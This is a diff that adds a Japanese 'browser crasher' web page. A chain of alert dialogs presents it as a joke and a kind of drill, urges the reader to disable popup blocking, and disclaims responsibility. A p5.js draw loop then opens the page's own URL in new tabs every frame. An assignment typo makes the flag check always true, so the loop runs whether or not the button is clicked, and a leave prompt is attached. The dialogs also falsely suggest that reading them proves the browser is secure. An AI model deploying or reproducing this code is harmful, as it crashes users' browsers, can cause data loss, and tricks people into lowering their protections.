@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<!--Browser crasher 2021-->
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="shortcut icon" href="https://raw.githubusercontent.com/Castoroides/uky/main/favicon.ico">
+  <title>ブラウザクラッシャー2021</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  
+  
+</head>
+
+<body>
+  <marquee behavior="alternate"><font face="HGP創英角ﾎﾟｯﾌﾟ体" size="7"><b><font color="#ff0000">令</font><font color="#ff5500">和</font><font color="#ffaa00">式</font><font color="#ffff00">ブ</font><font color="#aaff00">ラ</font><font color="#55ff00">ク</font><font color="#00ff00">ラ</font><font color="#00ff55">（</font><font color="#00ffaa">仮</font><font color="#00ffff">）</font></b></font></marquee>
+  <div class="gradient"></div>
+  <div>
+    <p class=txt>ボタンを押してね！</p>
+    <button type="button" class="s_b" onclick="buttonClick()">クリック！</button>
+  </div>
+</body>
+
+<style>
+@charset "Shift_JIS";
+body {
+  background: linear-gradient(25deg,#fcc5e4 0%,
+    #ff0000 15%,
+    #ffc000 35%,
+    #ffff00 52%,
+    #00ff00 71%,
+    #0000ff 87%,
+    #ff00ff 100%) fixed;
+}
+
+div {
+  margin: 120px 0;
+  text-align: center;
+}
+.txt {
+  font-family: Meiryo, "Hiragino Kaku Gothic Pro W3", Courier New, sans-serif;
+  line-height: 1.5;
+  margin-bottom: 25px;
+  color: #0000ff;
+  font-size: 2.5rem;
+}
+.s_b {
+  width: 30vw;
+  height: 20vh;
+  color: #000;
+  font-size: 1.5rem;
+  font-family:"HGP創英角ﾎﾟｯﾌﾟ体";
+}
+.s_b:hover {
+  background: linear-gradient(#fcc5e4 0%,
+    #ff0000 15%,
+    #0000ff 87%,
+    #ff00ff 100%) fixed;
+    color: #fff;
+}
+</style>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/p5.js/1.1.9/p5.min.js"></script>
+<script>
+var dialog_list = ["ようこそ！", "これはブラウザクラッシャーです！", "ブラウザクラッシャーとは、その名の通りブラウザに負荷をかける処理を行わせてクラッシュさせるといったジョークプログラムのことです。", "有名な物でいうと「You are an idiot」などがありますね。","対処方法がわかっている方であれば、たいして危険なプログラムではありませんが\nわかっていない人だとPCに負荷がかかりすぎてデータが破損することもあるようですので十分お気を付けください。","もちろんこのWebページもきちんと対処法を知っていれば何も危ないことはありません。","そもそもこの文章を読めている時点でお使いのブラウザはセキュリティがしっかりしているということが証明済みです。\n本来なら既にブラクラプログラムが作動しているはずですが、ブラウザによってブロックされているからこそ、この文章が読めるためです。","一種の避難訓練だと思ってウィンドウ右上から「ポップアップブロック」を解除してみてください、ウィンドウが無限増殖していきます。","Xボタンでブラウザがクラッシュする前に閉じると良いですよ^^\nやばいときはCtrl+Shift+Esc でタスクマネージャー開いてブラウザのタスクを終了してね！","最後に、本プログラムにて生じた故障又は損害などに関しては一切の責任を負いかねますのであらかじめご了承ください。\n自己責任ということでお試しください。"];
+introduce()
+function introduce(){
+	for(i=0; i<10; i++){
+		alert(dialog_list[i]);
+	}
+}
+open_flag = 0
+function buttonClick(){
+	open_flag = 1
+}
+const url = "https://castoroides.github.io/burakura/3_burakura2021.html"
+// ページが読みこまれた際に実行される、1フレーム（1/60秒）ごとに実行される関数
+function draw() {
+	if (open_flag = 1){
+		//無限タブ増殖
+		window.open(url, "_blank")
+	}
+}
+// Close字のメッセージ
+window.onbeforeunload = function(e) {
+	e.returnValue = "また来てね＾＾";
+}
+</script>
+
+
+</html>
